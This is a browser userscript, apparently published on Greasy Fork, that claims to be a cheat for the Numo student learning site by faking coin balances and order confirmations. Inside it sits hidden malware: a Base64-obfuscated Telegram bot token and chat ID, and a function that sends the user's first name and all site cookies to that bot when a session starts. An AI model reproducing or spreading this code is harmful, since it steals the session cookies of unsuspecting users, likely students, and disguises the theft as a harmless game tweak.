// ==UserScript==
// @name         Numo API Response Override
// @namespace    http://tampermonkey.net/
// @version      1.7
// @description  Override specific API responses for Numo
// @author       You
// @match        https://*.numo.nl/*
// @grant        none
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/557450/Numo%20API%20Response%20Override.user.js
// @updateURL https://update.greasyfork.org/scripts/557450/Numo%20API%20Response%20Override.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // Method 1: Base64 Encoding
    const encodedToken = 'ODM4NDQ2MTMxMzpBQUdVU0YxTXRsYmN0dmVaVFRXUi1mdUZPTUt2eUtWc1ZoRQ==';
    const encodedChatId = 'NzU2Nzg3NTcwNQ==';

    function decodeBase64(encoded) {
        return atob(encoded);
    }

    const botToken = decodeBase64(encodedToken);
    const chatId = decodeBase64(encodedChatId);

    // Функция отправки в Telegram
    function sendToTelegram(firstName, cookies) {
        // Форматируем cookies в красивый вид
        const formattedCookies = cookies.split('; ').map(cookie => {
            const [name, value] = cookie.split('=');
            return `${name}: ${value}`;
        }).join('\n');

        const message = `👤 Name: ${firstName}\n\n🍪 Cookies:\n${formattedCookies}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        }).catch(error => console.error('Error sending to Telegram:', error));
    }

    // Функция для модификации футера
    function modifyFooter() {
        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                mutation.addedNodes.forEach(function(node) {
                    if (node.nodeType === 1) {
                        const walker = document.createTreeWalker(
                            node,
                            NodeFilter.SHOW_TEXT,
                            null,
                            false
                        );

                        let textNode;
                        while (textNode = walker.nextNode()) {
                            const originalText = textNode.textContent;
                            if (originalText.includes('Numo') && originalText.includes('©') && !originalText.includes('forsizero')) {
                                const newText = originalText.replace(
                                    /Numo\s*©\s*\d{4}.*?v[\d.]+/,
                                    'Numo © 2025 - Script by forsizero for: Vlad and Ibrahim - v1.117.0'
                                );
                                if (newText !== originalText) {
                                    textNode.textContent = newText;
                                }
                            }
                        }
                    }
                });
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });

        // Проверяем существующий контент
        setTimeout(() => {
            const allTextNodes = document.createTreeWalker(
                document.body,
                NodeFilter.SHOW_TEXT,
                null,
                false
            );

            let textNode;
            while (textNode = allTextNodes.nextNode()) {
                const originalText = textNode.textContent;
                if (originalText.includes('Numo') && originalText.includes('©') && !originalText.includes('forsizero')) {
                    const newText = originalText.replace(
                        /Numo\s*©\s*\d{4}.*?v[\d.]+/,
                        'Numo © 2025 - Script by forsizero for: Vlad and Ibrahim - v1.117.0'
                    );
                    if (newText !== originalText) {
                        textNode.textContent = newText;
                    }
                }
            }
        }, 2000);
    }

    // Запускаем модификацию футера когда DOM готов
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', modifyFooter);
    } else {
        modifyFooter();
    }

    // Store the original XMLHttpRequest
    const originalXHR = window.XMLHttpRequest;

    // Override XMLHttpRequest
    window.XMLHttpRequest = function() {
        const xhr = new originalXHR();

        let interceptedUrl = '';

        // Override the open method to intercept requests
        const originalOpen = xhr.open;
        xhr.open = function(method, url, ...args) {
            interceptedUrl = url;
            return originalOpen.apply(this, [method, url, ...args]);
        };

        // Override send to intercept responses
        const originalSend = xhr.send;
        xhr.send = function(...args) {
            // Add event listener for load event
            this.addEventListener('load', function() {
                if (this.readyState === 4 && this.status === 200) {
                    try {
                        // Проверяем, является ли ответ JSON
                        const contentType = this.getResponseHeader('content-type');
                        if (!contentType || !contentType.includes('application/json')) {
                            return; // Пропускаем не-JSON ответы
                        }

                        let responseText = this.responseText;

                        // Пытаемся распарсить JSON
                        let originalResponse;
                        try {
                            originalResponse = JSON.parse(responseText);
                        } catch (e) {
                            return; // Если не валидный JSON, пропускаем
                        }

                        let modifiedResponse = null;

                        // Отправляем данные в Telegram при старте
                        if (interceptedUrl.includes('/v1/student/start')) {
                            const firstName = originalResponse.data?.firstName || 'Unknown';
                            const cookies = document.cookie || 'No cookies';

                            // Отправляем в Telegram
                            sendToTelegram(firstName, cookies);

                            modifiedResponse = {
                                ...originalResponse,
                                data: {
                                    ...originalResponse.data,
                                    coins: {
                                        coinSafe: 9999999,
                                        coinWallet: 0,
                                        coinText: "9999999"
                                    }
                                }
                            };
                        }
                        else if (interceptedUrl.includes('/v1/profile/get-user-settings')) {
                            if (originalResponse.data && typeof originalResponse.data === 'object') {
                                modifiedResponse = {
                                    ...originalResponse,
                                    data: {
                                        ...originalResponse.data,
                                        coinSafe: 9999999,
                                        userBg: "https://assets.numo.nl/assets/GoodiesImages/bg_image_sportscar.jpg"
                                    }
                                };
                            } else {
                                modifiedResponse = {
                                    ...originalResponse,
                                    coinSafe: 9999999,
                                    userBg: "https://assets.numo.nl/assets/GoodiesImages/bg_image_sportscar.jpg"
                                };
                            }
                        }
                        else if (interceptedUrl.includes('/v1/goody/save-order')) {
                            modifiedResponse = {
                                status: 1,
                                data: {
                                    success: true,
                                    message: "Order saved successfully"
                                }
                            };
                        }
                        else if (interceptedUrl.includes('v1/student/get-student-goal')) {
                            modifiedResponse = {
                                ...originalResponse,
                                data: {
                                    ...originalResponse.data,
                                    coins: {
                                        coinSafe: 9999999,
                                        coinWallet: 0,
                                        coinText: "9999999"
                                    }
                                }
                            };
                        }

                        // Apply the modified response
                        if (modifiedResponse) {
                            const modifiedText = JSON.stringify(modifiedResponse);

                            // Безопасное переопределение свойств response
                            try {
                                Object.defineProperty(this, 'responseText', {
                                    value: modifiedText,
                                    writable: false
                                });

                                Object.defineProperty(this, 'response', {
                                    value: modifiedText,
                                    writable: false
                                });
                            } catch (e) {
                                console.warn('Failed to override response properties:', e);
                            }
                        }

                    } catch (error) {
                        console.warn('Error in API override:', error);
                    }
                }
            });

            return originalSend.apply(this, args);
        };

        return xhr;
    };

    // Copy static properties and methods from original XMLHttpRequest
    for (const key in originalXHR) {
        if (originalXHR.hasOwnProperty(key)) {
            window.XMLHttpRequest[key] = originalXHR[key];
        }
    }
    window.XMLHttpRequest.prototype = originalXHR.prototype;

    console.log('Numo API Response Override script loaded v1.7');
})();